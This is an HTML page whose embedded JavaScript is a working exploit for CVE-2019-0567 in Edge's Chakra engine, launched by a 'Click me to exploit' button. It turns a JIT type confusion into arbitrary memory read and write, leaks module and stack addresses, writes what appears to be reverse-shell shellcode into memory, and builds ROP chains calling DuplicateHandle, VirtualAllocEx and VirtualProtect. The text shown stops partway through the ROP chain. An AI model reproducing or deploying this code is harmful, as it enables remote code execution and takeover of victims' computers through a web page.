<button onclick="main()">Click me to exploit CVE-2019-0567!</button>

<script>
// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
// 15063 build
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

dataview1.setUint32(0x0, 0x43434343, true); 
dataview1.setUint32(0x4, 0x43434343, true); 
dataview1.setUint32(0x8, 0x43434343, true); 
dataview1.setUint32(0xc, 0x43434343, true); 
dataview1.setUint32(0x10, 0x43434343, true); 
dataview1.setUint32(0x14, 0x43434343, true); 
dataview1.setUint32(0x18, 0x43434343, true); 
dataview1.setUint32(0x1c, 0x43434343, true); 
dataview1.setUint32(0x20, 0x43434343, true); 
dataview1.setUint32(0x24, 0x43434343, true); 
dataview1.setUint32(0x28, 0x43434343, true); 
dataview1.setUint32(0x2c, 0x43434343, true); 
dataview1.setUint32(0x30, 0x43434343, true); 
dataview1.setUint32(0x34, 0x43434343, true); 
dataview1.setUint32(0x38, 0x43434343, true); 
dataview1.setUint32(0x3c, 0x43434343, true); 
dataview1.setUint32(0x40, 0x43434343, true); 
dataview1.setUint32(0x44, 0x43434343, true); 
dataview1.setUint32(0x48, 0x43434343, true); 
dataview1.setUint32(0x4c, 0x43434343, true); 

dataview2.setUint32(0x0, 0x44444444, true); 
dataview2.setUint32(0x4, 0x44444444, true); 
dataview2.setUint32(0x8, 0x44444444, true); 
dataview2.setUint32(0xc, 0x44444444, true); 

function opt(o, proto, value) {
    o.b = 1;
    let tmp = {__proto__: proto};
    o.a = value;
}

function hex(x) {
    x = x.toString(16);
    while (x.length < 8) x = "0"+x
    return x
}

function write64(addressLower64Bit, addressHigher64Bit, valueLower64Bit, valueHigher64Bit) {
    // 0x38/0x8 = 0x7
    // dataview1.setUint32(0x38...) is basically obj.h
    dataview1.setUint32(0x38, addressLower64Bit, true);     // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, addressHigher64Bit, true);    // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)
    dataview2.setUint32(0x0, valueLower64Bit, true);        // 4-byte arbitrary write
    dataview2.setUint32(0x4, valueHigher64Bit, true);       // 4-byte arbitrary write
}

function read64(addressLower64Bit, addressHigher64Bit) {
    // 0x38/0x8 = 0x7
    // dataview1.setUint32(0x38...) is basically obj.h
    dataview1.setUint32(0x38, addressLower64Bit, true);     // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, addressHigher64Bit, true);    // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)
    
    var read = new Uint32Array(0x10);
    read[0] = dataview2.getUint32(0x0, true);
    read[1] = dataview2.getUint32(0x4, true);
    return read
}

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }
    let o = {a: 0x41414141, b: 0x42424242};   
    opt(o, o, obj);       
    o.c = dataview1 

    obj.h = dataview2
    leakLo = dataview1.getUint32(0, true);
    leakHi = dataview1.getUint32(4, true);
    document.write("[+] Pointer to DataView->buffer leaked: 0x" + hex(leakHi) + hex(leakLo));
    document.write("<br>");

    if (hex(leakHi) + hex(leakLo) === "4343434343434343") {
        document.write("[*] Exploit failed :(")
        document.write("<br>");
        return
    }

    chakraLo = dataview1.getUint32(0, true)-0x005d0bf8;
    chakraHigh = dataview1.getUint32(4, true);
    document.write("[+] ChakraCore.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));
    document.write("<br>");

    typeLo = dataview1.getUint32(0x8, true);
    typeHigh = dataview1.getUint32(0xC, true);
    javascriptLibrary = read64(typeLo+8, typeHigh);
    scriptContext = read64(javascriptLibrary[0]+0x430, javascriptLibrary[1])
    threadContext = read64(scriptContext[0]+0x5c0, scriptContext[1])
    stackleakPointer = read64(threadContext[0]+0x8f8, threadContext[1]);
    document.write("[+] Leaked stack address! type->javascriptLibrary->scriptContext->threadContext->leafInterpreterFrame: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]));
    document.write("<br>");

    //////////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////////////
    /*
    for (let counter = 0; counter<0x6000; counter+=8) {
        tempContents = read64(stackleakPointer[0]+counter, stackleakPointer[1]);
        if (tempContents[1] === chakraHigh) {
            document.write("[+] Possible to hijack control flow at: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]+counter) + " containing :0x" + hex(tempContents[1]) + hex(tempContents[0]) );
            document.write("<br>");
        }
    }

0:039> u 7ffdd83a3033
chakra!JsCreateContext+0x61f3:
00007ffd`d83a3033 488be5          mov     rsp,rbp
00007ffd`d83a3036 5d              pop     rbp
00007ffd`d83a3037 5f              pop     rdi
00007ffd`d83a3038 5e              pop     rsi
00007ffd`d83a3039 5b              pop     rbx
00007ffd`d83a303a c3              ret
00007ffd`d83a303b 0f1f440000      nop     dword ptr [rax+rax]
00007ffd`d83a3040 48eb3d          jmp     chakra!JsCreateContext+0x6240 (00007ffd`d83a3080)
    */
    //////////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////////////

    // Counter variable
    var returnAddress = new Uint32Array(0x4);
    returnAddress[0] = chakraLo + 0xd4a73;
    returnAddress[1] = chakraHigh;

    // Counter variable
    let counter = 0x6000;
    let final = -1

    // Loop
    while (counter != 0)
    {
        // Store the contents of the stack
        tempContents = read64(stackleakPointer[0]+counter, stackleakPointer[1]);

        // Did we find our target return address?
        if ((tempContents[0] == returnAddress[0]) && (tempContents[1] == returnAddress[1]))
        {
            document.write("[+] Found our return address on the stack!");
            document.write("<br>");
            document.write("[+] Target stack address: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]+counter));
            document.write("<br>");
            final = counter
            // Break the loop
            break;

        }
        else
        {
            // Decrement the counter
            // This is because the leaked stack address is near the stack base so we need to traverse backwards towards the stack limit
            counter -= 0x8;
        }
    }

    if (final === -1 ) {
        document.write("[+] We messed up");
        document.write("<br>");
        return
    }

    chakraKernel32FlushInstructionCacheIatEntry = read64(chakraLo+0x5ee570, chakraHigh);
    chakraKernel32FlushInstructionCacheIatEntry[0] -= 0x00018f90

    chakraKernelBaseGetProcessMitigationPolicyIatEntry = read64(chakraLo+0x5ee578, chakraHigh);
    chakraKernelBaseGetProcessMitigationPolicyIatEntry[0] -= 0x00064120

    var stc = new Uint32Array(0x10)
    stc[0] = chakraKernelBaseGetProcessMitigationPolicyIatEntry[0]+0x00007aa0
    stc[1] = chakraKernelBaseGetProcessMitigationPolicyIatEntry[1]

    var rt = new Uint32Array(0x10)
    rt[0] = chakraKernelBaseGetProcessMitigationPolicyIatEntry[0]+0x00070a50
    rt[1] = chakraKernelBaseGetProcessMitigationPolicyIatEntry[1]

    document.write("[+] Kernel32 Base Address: 0x" + hex(chakraKernel32FlushInstructionCacheIatEntry[1]) + hex(chakraKernel32FlushInstructionCacheIatEntry[0]));
    document.write("<br>");

    var CreateToolhelp32Snapshot = new Uint32Array(0x10)
    CreateToolhelp32Snapshot[0] = chakraKernel32FlushInstructionCacheIatEntry[0]+0x23160
    CreateToolhelp32Snapshot[1] = chakraKernel32FlushInstructionCacheIatEntry[1]

    document.write("[+] CreateToolhelp32Snapshot Base Address: 0x" + hex(CreateToolhelp32Snapshot[1]) + hex(CreateToolhelp32Snapshot[0]));
    document.write("<br>");

    Process32First = new Uint32Array(0x10)
    Process32First[0] = chakraKernel32FlushInstructionCacheIatEntry[0]+0x0005c660
    Process32First[1] = chakraKernel32FlushInstructionCacheIatEntry[1]

    document.write("[+] ProcessFirst Base Address: 0x" + hex(Process32First[1]) + hex(Process32First[0]));
    document.write("<br>");

    Process32Next = new Uint32Array(0x10)
    Process32Next[0] = chakraKernel32FlushInstructionCacheIatEntry[0]+0x0005c750
    Process32Next[1] = chakraKernel32FlushInstructionCacheIatEntry[1]

    document.write("[+] Process32Next Base Address: 0x" + hex(Process32Next[1]) + hex(Process32Next[0]));
    document.write("<br>");

    DuplicateHandle = new Uint32Array(0x10)
    DuplicateHandle[0] = chakraKernel32FlushInstructionCacheIatEntry[0]+0x00021f10
    DuplicateHandle[1] = chakraKernel32FlushInstructionCacheIatEntry[1]

    document.write("[+] DuplicateHandle Base Address: 0x" + hex(DuplicateHandle[1]) + hex(DuplicateHandle[0]));
    document.write("<br>");

    jitHandle = read64(chakraLo+0x74d838, chakraHigh);

    document.write("[+] JIT Handle Address: 0x" + hex(jitHandle[1]) + hex(jitHandle[0]));
    document.write("<br>");

    VirtualAllocEx = new Uint32Array(0x10)
    VirtualAllocEx[0] = chakraKernel32FlushInstructionCacheIatEntry[0]+0x00037b60
    VirtualAllocEx[1] = chakraKernel32FlushInstructionCacheIatEntry[1]

    wpm = new Uint32Array(0x10)
    wpm[0] = chakraKernel32FlushInstructionCacheIatEntry[0]+0x00037c50
    wpm[1] = chakraKernel32FlushInstructionCacheIatEntry[1]

    crt = new Uint32Array(0x10)
    crt[0] = chakraKernel32FlushInstructionCacheIatEntry[0]+0x00036ab0
    crt[1] = chakraKernel32FlushInstructionCacheIatEntry[1]

    gtc = new Uint32Array(0x10)
    gtc[0] = chakraKernel32FlushInstructionCacheIatEntry[0]+0x0001de00
    gtc[1] = chakraKernel32FlushInstructionCacheIatEntry[1]

    vp = new Uint32Array(0x10)
    vp[0] = chakraKernel32FlushInstructionCacheIatEntry[0]+0x0001b320
    vp[1] = chakraKernel32FlushInstructionCacheIatEntry[1]

    alert("DEBUGG")

    ////////////////////////////////////////////////////////////////////////////////////
    // STAGE -1: Create a shellcode in CP //////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////

    counter = 0

write64(chakraLo+0x74b000+counter, chakraHigh, 0x90909090, 0x90909090);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xe48348fc, 0x00c0e8f0);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x51410000, 0x51525041);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xd2314856, 0x528b4865);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x528b4860, 0x528b4818);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x728b4820, 0xb70f4850);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x314d4a4a, 0xc03148c9);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x7c613cac, 0x41202c02);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x410dc9c1, 0xede2c101);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x48514152, 0x8b20528b);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x01483c42, 0x88808bd0);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x48000000, 0x6774c085);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x50d00148, 0x4418488b);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x4920408b, 0x56e3d001);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x41c9ff48, 0x4888348b);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x314dd601, 0xc03148c9);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xc9c141ac, 0xc101410d);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xf175e038, 0x244c034c);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xd1394508, 0x4458d875);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x4924408b, 0x4166d001);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x44480c8b, 0x491c408b);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x8b41d001, 0x01488804);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x415841d0, 0x5a595e58);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x59415841, 0x83485a41);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x524120ec, 0x4158e0ff);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x8b485a59, 0xff57e912);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x495dffff, 0x327377be);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x0032335f, 0x49564100);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x8148e689, 0x0001a0ec);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xe5894900, 0x0002bc49);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xa8c0f604, 0x544180d5);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x4ce48949, 0xba41f189);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x0726774c, 0x894cd5ff);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x010168ea, 0x41590000);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x6b8029ba, 0x50d5ff00);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xc9314d50, 0x48c0314d);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x8948c0ff, 0xc0ff48c2);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x41c18948, 0xdf0feaba);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x48d5ffe0, 0x106ac789);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x894c5841, 0xf98948e2);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xa599ba41, 0xd5ff6174);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x40c48148, 0x49000002);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x646d63b8, 0x00000000);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x41504100, 0xe2894850);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x4d575757, 0x0d6ac031);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xe2504159, 0x44c766fc);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x01015424, 0x24448d48);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x6800c618, 0x56e68948);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x41504150, 0x49504150);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x5041c0ff, 0x4dc8ff49);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x894cc189, 0x79ba41c1);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xff863fcc, 0xd23148d5);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x8bcaff48, 0x08ba410e);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xff601d87, 0xb5f0bbd5);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xba4156a2, 0x9dbd95a6);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x8348d5ff, 0x063c28c4);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xfb800a7c, 0xbb0575e0);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0x6f721347, 0x4159006a);
counter+=8
write64(chakraLo+0x74b000+counter, chakraHigh, 0xd5ffda89, 0x90909090);
counter+=8

/*
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x90909090, 0x90909090);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xe48348fc, 0x00c0e8f0);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x51410000, 0x51525041);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xd2314856, 0x528b4865);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x528b4860, 0x528b4818);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x728b4820, 0xb70f4850);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x314d4a4a, 0xc03148c9);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x7c613cac, 0x41202c02);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x410dc9c1, 0xede2c101);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x48514152, 0x8b20528b);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x01483c42, 0x88808bd0);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x48000000, 0x6774c085);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x50d00148, 0x4418488b);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x4920408b, 0x56e3d001);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x41c9ff48, 0x4888348b);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x314dd601, 0xc03148c9);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xc9c141ac, 0xc101410d);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xf175e038, 0x244c034c);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xd1394508, 0x4458d875);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x4924408b, 0x4166d001);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x44480c8b, 0x491c408b);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x8b41d001, 0x01488804);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x415841d0, 0x5a595e58);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x59415841, 0x83485a41);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x524120ec, 0x4158e0ff);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x8b485a59, 0xff57e912);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x495dffff, 0x327377be);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x0032335f, 0x49564100);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x8148e689, 0x0001a0ec);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xe5894900, 0x0002bc49);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xa8c0f604, 0x544180d5);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x4ce48949, 0xba41f189);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x0726774c, 0x894cd5ff);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x010168ea, 0x41590000);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x6b8029ba, 0x50d5ff00);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xc9314d50, 0x48c0314d);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x8948c0ff, 0xc0ff48c2);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x41c18948, 0xdf0feaba);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x48d5ffe0, 0x106ac789);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x894c5841, 0xf98948e2);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xa599ba41, 0xd5ff6174);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x40c48148, 0x49000002);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x646d63b8, 0x00000000);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x41504100, 0xe2894850);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x4d575757, 0x0d6ac031);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xe2504159, 0x44c766fc);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x01015424, 0x24448d48);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x6800c618, 0x56e68948);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x41504150, 0x49504150);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x5041c0ff, 0x4dc8ff49);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x894cc189, 0x79ba41c1);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xff863fcc, 0xd23148d5);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x8bcaff48, 0x08ba410e);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xff601d87, 0xb5f0bbd5);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xba4156a2, 0x9dbd95a6);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x8348d5ff, 0x063c28c4);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xfb800a7c, 0xbb0575e0);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x6f721347, 0x4159006a);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xd5ffda89, 0x90909090);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x90909090, 0x90909090);
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x90909090, 0x90909090);
    counter+=8
*/

    counter += 0x3000
    storage = counter-0x2800

    ////////////////////////////////////////////////////////////////////////////////////
    // STAGE 0: VP ROP in CP ///////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////

    START_OF_ROP_CHAIN = counter

    //write64(chakraLo+0x74b000+counter, chakraHigh, chakraLo+0x03f420e, chakraHigh);  // int3
    //counter+=8         
    write64(chakraLo+0x74b000+counter, chakraHigh, chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, vp[0], vp[1]); // VIRTUALPROTECT 
    counter+=8  

    write64(chakraLo+0x74b000+counter, chakraHigh, chakraLo+0x46377, chakraHigh);    // 0x180046377: pop rcx ; ret  ;  (1 found)
    counter+=8

    SHELLCODE_ADDRESS_COUNTER_1 = counter

    write64(chakraLo+0x74b000+counter, chakraHigh, 0xcdcdcdcd, 0xcdcdcdcd); // UNKNOWN SHELLCODE ADDRESS 
    counter+=8  

    write64(chakraLo+0x74b000+counter, chakraHigh, chakraLo+0x1d2c9, chakraHigh);    // 0x18001d2c9: pop rdx ; ret  ;  (1 found)
    counter+=8
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x400, 0x0); // 0x1000
    counter+=8  

    write64(chakraLo+0x74b000+counter, chakraHigh, chakraLo+0x00272be1, chakraHigh);    
    // 0x180272bdd: mov edx, dword [rsp+0x10] ; mov r8, qword [rsp+0x18] ; mov r9, qword [rsp+0x20] ; jmp rax ;  (1 found)
    counter+=8
    SHELLCODE_ADDRESS_COUNTER_2 = counter
    write64(chakraLo+0x74b000+counter, chakraHigh, 0xcdcdcdcd, 0xcdcdcdcd); // UNKNOWN SHELLCODE ADDRESS 
    counter+=8  
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x41414141, 0x41414141); // 0x8
    counter+=8  
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x41414141, 0x41414141); // 0x10
    counter+=8  
    write64(chakraLo+0x74b000+counter, chakraHigh, 0x40, 0x0); // 0x18 r8
    counter+=8  
    write64(chakraLo+0x74b000+counter, chakraHigh, chakraLo+0x74b000+0x4000, chakraHigh); // UNKNOWN SHELLCODE ADDRESS 
    counter+=8  

    ////////////////////////////////////////////////////////////////////////////////////
    // STAGE 1: Get handle to JIT server via DuplicateHandle ///////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////

    ropCounter = 0

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], DuplicateHandle[0], DuplicateHandle[1]); // DuplicateHandle 
    ropCounter+=8  


    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x272bd7, chakraHigh);
    ropCounter+=8
    // 0x180272bdc: mov rdx, qword [rsp+0x10] ; mov r8, qword [rsp+0x18] ; mov r9, qword [rsp+0x20] ; jmp rax ;  (1 found)

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x0045481c, chakraHigh); // +0x0
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], jitHandle[0], jitHandle[1]); // +0x8 (rcx value)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0xffffffff, 0xffffffff); // +0x10 (rdx) 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0xffffffff, 0xffffffff); // +0x18 (r8)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage, chakraHigh); // +0x20 (r9) DUPLICATE HANDLE ALL PERMS ADDRESS
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x0, 0x0); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x0, 0x0); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x2, 0x0); 
    ropCounter+=8

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8

    ////////////////////////////////////////////////////////////////////////////////////
    // STAGE 2: Allocate space in JIT process //////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8

    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x50267a, chakraHigh);    // 0x18050267a: pop rcx ; ret  ;  (1 found)
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage, chakraHigh); // +0x8 (rcx value)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage+0x20, chakraHigh); 
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x000d2125, chakraHigh);    // 0x1800d2125:  mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret  ;  (1 found)
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], VirtualAllocEx[0], DuplicateHandle[1]); // VirtualAllocEx 
    ropCounter+=8  
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x272bdc, chakraHigh);
    ropCounter+=8
    // 0x180272bdc: mov rdx, qword [rsp+0x10] ; mov r8, qword [rsp+0x18] ; mov r9, qword [rsp+0x20] ; jmp rax ;  (1 found)
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x0045481c, chakraHigh); // +0x0 pivot
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x74b000+storage, chakraHigh); // +0x8 (rcx value)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x0, 0x0); // +0x10 (rdx) 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x1000, 0x0); // +0x18 (r8)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x3000, 0x0); // +0x20 (r9)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], 0x4, 0x0); 
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x4947c9, chakraHigh);    // 0x1804947c9: ret  ;  (1 found)
    ropCounter+=8
